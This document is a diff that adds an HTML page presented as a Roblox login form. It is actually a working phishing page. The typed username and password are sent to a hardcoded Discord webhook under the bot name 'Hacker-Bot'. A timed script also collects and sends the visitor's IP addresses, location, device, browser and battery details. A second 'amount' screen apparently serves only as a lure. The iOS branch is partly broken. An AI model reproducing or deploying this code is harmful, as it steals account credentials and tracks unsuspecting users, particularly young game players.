@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    .Input{
+      background-color: hsl(200, 10%, 100%);
+      color: hsl(240, 10%, 10%);
+      border: 0px solid hsl(240, 10%, 40%);
+      border-radius: 8px;
+      transition: all 1s;
+      cursor: pointer;
+      width: 350px;
+      height: 40px;
+      margin: 1px 25px 1px;}
+    body{
+      background-color: hsl(240, 20%, 70%);
+      justify-content: center;
+      align-items: center;
+      display: flex;}
+    .button{
+      margin: 1px 25px 1px;
+      border-radius: 8px;
+      border: 1px solid hsl(0, 0%, 70%);
+      background-color: hsl(220, 60%, 55%);
+      color: hsl(0, 0%, 90%);
+      font-size: 1rem;
+      width: 350px;
+      transition: all 0.3s;
+      cursor: pointer;
+      font-weight: bolder;
+      height: 40px;}
+    .TextRed{
+      color: red;
+      transform: scaleX(0);
+      transition: all 0.5s;
+      margin: 1px 25px 1px;
+      font-size: 2.5mm}
+    .Text{
+      margin: 20px 0px 8px 145px;
+      color: hsl(240, 10%, 0%);
+      font-weight: bold;}
+    .Frame{
+      background-color: hsl(240, 10%, 90%);
+      border-radius: 10px;
+      width: 400px;
+      transition: all 5s;
+      height: 400px;}
+    ::placeholder{
+      color: hsl(222, 6%, 40%);
+      font-weight: normal;}
+    .button:hover{
+      background-color: hsl(200, 90%, 50%);
+      transform: scale(0.95);
+    }
+    .button:active{
+      background-color: hsl(200, 90%, 50%);}
+    .Gui2{
+      transition: all 0.3s;
+      transform: scale(0);}
+    .im{
+    	width: 100px;
+    }
+  </style>
+</head>
+<body>
+  <div class="Frame" id="Frame">
+ <h1 class="Text">Roblox</h1>
+ <div id="Gui1"><br>
+  <div><input type="text" name="Name" id="Name" value="" class="Input" placeholder="Please enter the username/ID" required/><div class="TextRed" id="SN">Enter the name</div></div><br>
+  <div><input type="password" name="Password2" id="Password2" class="Input" placeholder="Password" required/><div class="TextRed" id="SP2">Enter the password</div></div><br>
+  <button class="button" type="submit" onclick="One(this)">Done</button>
+  </div>
+  <div id="Gui2" class="Gui2" >
+    <div><input type="number" name="" id="amount" class="Input" placeholder="Enter the amount"></div><br>
+    <div><button class="button" type="submit" id="buttonSend" onclick="Send()">Send</button></div><br>
+  </div>
+  </div>
+  <script>
+  function One(event) {
+      const Gui1 = document.getElementById("Gui1");
+      const Gui2 = document.getElementById("Gui2");
+      const Name = document.getElementById("Name").value;
+      const Password2 = document.getElementById("Password2").value;
+      const SN = document.getElementById("SN");
+      const SP2 = document.getElementById("SP2");
+      if (Name === "") {
+          SN.style.transform = "scaleX(1)";
+      }else{
+      if (Name.length < 6) {
+          SN.textContent = "Please enter at least 6 character";
+          SN.style.transform = "scaleX(1)";
+      }else{
+          SN.style.transform = "scaleX(0)";}}
+      if (Password2 === "") {
+         SP2.textContent = "Enter the password";
+         SP2.style.transform = "scaleX(1)";
+      }else{
+         if (Password2.length < 6) {
+         SP2.textContent = "Please enter at least 6 character";
+         SP2.style.transform = "scaleX(1)";
+      }else{
+         SP2.style.transform = "scaleX(0)";}}
+      if (Password2.length > 5 && Name.length > 5) {
+        Gui1.style.display = 'none';
+        Gui2.style.transform = 'scaleX(1)';
+        event.style.transform = 'scaleX(0)';
+      const info = 
+`[+]Information: 2
+[+]Name: ${Name}
+[+]Password: ${Password2}`;
+console.log(info);
+const messagePayload = {content: `\`\`\`\n${info}\n\`\`\``, username: "Hacker-Bot: 2", avatar_url: "https://example.com/avatar.png"}
+fetch(webhookURL, {method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(messagePayload)})}}
+const webhookURL = "https://canary.discord.com/api/webhooks/1355803634037686344/_au3aPBo4iSJvyH6cNTJx50C9S_sQf9AAuAe9RYM0oGGo3I1L_Go8jq28CyoTwJrbT5a"
+const batteryInfo = navigator.getBattery ? navigator.getBattery() : null;
+const getDeviceName = () =>{
+const devices = ['iPhone', 'OPPO', 'Vivo', 'Realme', 'OnePlus', 'Samsung', 'Xiaomi', 'Huawei', 'Tecno', 'Windows', 'Macintosh', 'Linux'];
+const match = devices.find(device => new RegExp(device, 'i').test(navigator.userAgent));
+return match ? match.replace('Macintosh', 'Mac Device').replace('Windows', 'Windows Device').replace('Linux', 'Linux Device') : 'Unknown Device';};
+const getOSVersion = () =>{
+let ua = navigator.userAgent;
+let android = ua.match(/Android\s([\d.]+)/);
+let ios = ua.match(/OS (\d+_\d+(_\d+)?)/);
+if (android) return `Android ${android[1]}`;
+if (/iPad|iPhone|iPod/.test(ua)) return `iOS ${ios ? ios[1].replace(/_/g, ".") : "(version unknown)"}`;
+return "Unknown OS";};
+let os = getOSVersion();
+let IP = "Fetching...";
+let localIP = "Unavailable";
+let time = new Date();
+const deviceName = getDeviceName();
+const connection = navigator.connection || {};
+const ua = navigator.userAgent.toLowerCase();
+const isIOS = /iphone|ipad|ipod/.test(ua);
+const isAndroid = /android/.test(ua);
+const timeInfo = `${(time.getHours()<10?"0":"") + time.getHours()}:${(time.getMinutes()<10?"0":"") + time.getMinutes()}:${(time.getSeconds()<10?"0":"") + time.getSeconds()}`
+async function getIP(){
+    try {
+        let response = await fetch('https://api64.ipify.org?format=json');
+        let dataIP = await response.json();
+        IP = dataIP.ip;
+    } catch (error) {
+        console.error('Error fetching IP:', error);}}
+async function getLocalIP(){
+    return new Promise((resolve) => {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel("");
+        pc.setLocalDescription(pc.createOffer());
+        pc.onicecandidate = (e) => {
+            const candidate = e.candidate?.candidate?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
+            if (candidate) resolve(candidate);};
+        setTimeout(() => resolve("Unavailable"), 2000);});}
+async function getC(){
+    try {
+        let response = await fetch('https://ipapi.co/json/');
+        let data = await response.json();
+        C = data.country_name + " " + data.country, L = data.languages, CC = data.country_calling_code, Ci = data.city, Re = data.region, Of = data.utc_offset, TZ = data.timezone, LG = data.longitude, LT = data.latitude, CA = data.country_area, Asn = data.asn, Org = data.org, CP = data.country_population
+    } catch (error) {
+        console.error('Error fetching country:', error);
+        C = "Unknown";}}
+getIP(); getC();
+async function sendToDiscord(){
+ if (isAndroid){
+  getLocalIP().then((ip)=>{
+   localIP = ip;
+    batteryInfo.then(battery => {
+     let info = 
+`[+] Device: Android
+[+] Information: 1
+[+] Time: ${timeInfo||"Unknown"}
+[+] Country: ${C||"Unknown"}
+[+] Timezone: ${TZ||"Unknown"}
+[+] Public IP: ${IP||"Unknown"}
+[+] Local IP: ${localIP||"Unknown"}
+[+] Country Languages: ${L||"Unknown"}
+[+] Country Code: ${CC||"Unknown"}
+[+] City: ${Ci||"Unknown"}
+[+] Region: ${Re||"Unknown"}
+[+] Utc Offset: ${Of||"Unknown"}
+[+] Longitude: ${LG||"Unknown"}
+[+] Latitude: ${LT||"Unknown"}
+[+] Country_area: ${CA||"Unknown"}
+[+] Asn: ${Asn||"Unknown"}
+[+] Org: ${Org||"Unknown"}
+[+] Country Population: ${CP||"Unknown"}
+[+] Device Name: ${deviceName||"Unknown"}
+[+] Device Version: ${os||"Unknown"}
+[+] App Version: ${navigator.appVersion||"Unknown"}
+[+] App Name: ${navigator.appName||"Unknown"}
+[+] Online: ${navigator.onLine||"Unknown"}
+[+] Max Touch Points: ${navigator.maxTouchPoints||"Unknown"}
+[+] Product: ${navigator.product||"Unknown"}
+[+] UserAgent: ${navigator.userAgent||"Unknown"}
+[+] Platform: ${navigator.platform||"Unknown"}
+[+] Vendor: ${navigator.vendor||"Unknown"}
+[+] Language: ${navigator.language||"Unknown"}
+[+] Languages: ${navigator.languages||"Unknown"}
+[+] Cookie Enabled: ${navigator.cookieEnabled||"Unknown"}
+[+] App Code Name: ${navigator.appCodeName||"Unknown"}
+[+] Device Memory: ${navigator.deviceMemory||"Unknown"}
+[+] Hardware Concurrency: ${navigator.hardwareConcurrency||"Unknown"}
+[+] Downlink: ${connection.downlink||"Unknown"}
+[+] Save Data: ${navigator.connection.saveData||"Unknown"}
+[+] Effective Type: ${connection.effectiveType||"Unknown"}
+[+] RTT: ${connection.rtt || "Unknown"}
+[+] Battery Charging: ${battery.charging ? "true" : "false"||"Unknown"}
+[+] Battery Level: ${Math.round(battery.level * 100)||"Unknown"}%
+[+] Battery Charging Time: ${battery.chargingTime||"Unknown"}
+[+] Battery Discharging Time: ${battery.dischargingTime||"Unknown"}`;
+console.log(info);
+const messagePayload = {content: `\`\`\`\n${info}\n\`\`\``, username: "Hacker-Bot: 1", avatar_url: "https://example.com/avatar.png"}
+fetch(webhookURL, {method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(messagePayload)})})});
+}else if (isIOS){
+let info = 
+`[+] Device: Android
+[+] Information: 1
+[+] Time: ${timeInfo||"Unknown"}
+[+] Country: ${C||"Unknown"}
+[+] Timezone: ${TZ||"Unknown"}
+[+] Public IP: ${IP||"Unknown"}
+[+] Local IP: ${localIP||"Unknown"}
+[+] Country Languages: ${L||"Unknown"}
+[+] Country Code: ${CC||"Unknown"}
+[+] City: ${Ci||"Unknown"}
+[+] Region: ${Re||"Unknown"}
+[+] Utc Offset: ${Of||"Unknown"}
+[+] Longitude: ${LG||"Unknown"}
+[+] Latitude: ${LT||"Unknown"}
+[+] Country_area: ${CA||"Unknown"}
+[+] Asn: ${Asn||"Unknown"}
+[+] Org: ${Org||"Unknown"}
+[+] Country Population: ${CP||"Unknown"}
+[+] Device Name: ${deviceName||"Unknown"}
+[+] Device Version: ${os||"Unknown"}
+[+] App Version: ${navigator.appVersion||"Unknown"}
+[+] App Name: ${navigator.appName||"Unknown"}
+[+] Online: ${navigator.onLine||"Unknown"}
+[+] Max Touch Points: ${navigator.maxTouchPoints||"Unknown"}
+[+] Product: ${navigator.product||"Unknown"}
+[+] UserAgent: ${navigator.userAgent||"Unknown"}
+[+] Platform: ${navigator.platform||"Unknown"}
+[+] Vendor: ${navigator.vendor||"Unknown"}
+[+] Language: ${navigator.language||"Unknown"}
+[+] Languages: ${navigator.languages||"Unknown"}
+[+] Cookie Enabled: ${navigator.cookieEnabled||"Unknown"}
+[+] App Code Name: ${navigator.appCodeName||"Unknown"}
+[+] Device Memory: ${navigator.deviceMemory||"Unknown"}
+[+] Hardware Concurrency: ${navigator.hardwareConcurrency||"Unknown"}
+[+] Downlink: ${connection.downlink||"Unknown"}
+[+] Save Data: ${navigator.connection.saveData||"Unknown"}
+[+] Effective Type: ${connection.effectiveType||"Unknown"}
+[+] RTT: ${connection.rtt || "Unknown"}
+[+] Battery Charging: ${battery.charging ? "true" : "false"||"Unknown"}
+[+] Battery Level: ${Math.round(battery.level * 100)||"Unknown"}%
+[+] Battery Charging Time: ${battery.chargingTime||"Unknown"}
+[+] Battery Discharging Time: ${battery.dischargingTime||"Unknown"}`;
+const messagePayload = {
+    content: `\`\`\`\n${info}\n\`\`\``,
+    username: "Hacker-Bot: 1",
+    avatar_url: "https://example.com/avatar.png"}
+fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(messagePayload)})}};
+setTimeout(sendToDiscord, 5000);
+function Send() {
+      const button = document.getElementById("buttonSend");
+      const Send = document.getElementById("amount");
+      button.style.transform = 'scale(0)';
+      Send.style.transform = 'scale(0)';}
+  </script>
+</body>
+</html>
